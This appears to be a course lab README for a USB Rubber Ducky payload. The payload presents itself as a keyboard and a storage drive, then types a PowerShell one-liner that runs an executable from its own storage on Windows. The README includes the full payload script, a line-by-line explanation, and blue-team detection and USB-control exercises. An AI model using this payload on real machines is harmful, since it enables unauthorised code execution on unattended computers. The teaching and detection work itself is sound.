# Lab 11 — Staged Payload from Onboard USB Storage

**Payload:** [payload.txt](payload.txt)
**Target:** Windows 10/11, local (non-domain) machine, no elevation required
**Hardware requirement:** Ducky firmware/hardware with dual HID+STORAGE
("Twin Duck") support. Confirm your lab units support `ATTACKMODE STORAGE`
before class - older or single-mode units don't.
**ATT&CK techniques:** T1200 (Hardware Additions), T1059.001 (PowerShell),
T1204.002 (User Execution: Malicious File)

Unlike Lab 10 (pulls a file over the network), this payload carries its
own executable on the Ducky's onboard storage — nothing ever touches a
network interface. That makes it viable against fully air-gapped/offline
machines, and it leaves different artifacts than a network-based dropper.

## Setup (before running)

1. Copy the staged binary onto the Ducky's storage partition's root,
   named `p.exe`. For the lab, use an innocuous binary (a renamed
   `calc.exe` copy is fine).
2. Confirm the storage partition's volume label is exactly `DUCKY`
   (case-sensitive matters less than exact spelling — verify with
   `Get-Volume` from a known-good machine, or the Ducky's own config).

## What it does, line by line

```
ATTACKMODE HID STORAGE
                   Switches the device to present itself as BOTH a USB
                   HID keyboard and a USB mass storage device
                   simultaneously.
DELAY 3000         Storage devices take longer to enumerate and mount
                   than a keyboard alone - this is 3x Lab 08/10's
                   initial delay for that reason. Too short a delay
                   here is the #1 cause of this payload failing.
GUI r              Open the Run dialog.
DELAY 100
STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$m':\p.exe'"
ENTER              Submits the Run dialog.
```

### The PowerShell one-liner

```powershell
$m = (Get-Volume -FileSystemLabel 'DUCKY').DriveLetter
$m':\p.exe'
```

`Get-Volume -FileSystemLabel 'DUCKY'` looks up whatever drive letter
Windows assigned to the mounted storage partition — this is necessary
because that letter isn't predictable in advance (it depends on what
other drives are already attached to the victim machine).

The second statement, `$m':\p.exe'`, is a PowerShell syntax quirk worth
walking through with students: there's no operator between `$m` and the
string literal. When a statement begins with a variable immediately
followed by more tokens with no operator, PowerShell treats it as
**command invocation**, and adjacent expression parts with no whitespace
between them get string-concatenated into a single token first. So
`$m':\p.exe'` evaluates to invoking the command named by concatenating
`$m` (e.g. `E`) with `:\p.exe'`, i.e. it runs `E:\p.exe` — exactly like
typing that path directly at a PowerShell prompt. It's equivalent to
writing `& "${m}:\p.exe"`, just terser (and more confusing to read at a
glance, which is presumably why it shows up in real-world Ducky
payloads — shorter STRING lines type faster).

## Blue-team exercise

Run [detect.ps1](detect.ps1) on the victim VM. It checks for:

- Any currently-mounted volume labeled `DUCKY` (evidence the device may
  still be attached)
- Recent process creation from a non-`C:` drive letter (removable media)
- Security event 6416 ("a new external device was recognized") if audit
  policy for removable storage is enabled
- PowerShell script block log (4104) referencing `Get-Volume` /
  `FileSystemLabel`

This is also a good point to discuss **USB device control policies**
(Group Policy / Intune removable storage restrictions, or endpoint
products that allowlist HID+storage composite devices by VID/PID) as a
preventive control that would have stopped this before PowerShell ever
ran.

## Cleanup

Nothing persists on the victim's disk (the executable ran from the
Ducky's own storage). [cleanup.ps1](cleanup.ps1) just stops `p.exe` if
it's still running. Physically unplug the Ducky and revert the VM
snapshot to fully reset state between runs.

**Next:** [Lab 12 — Collection & Exfiltration](../Lab12_CollectionExfil/).
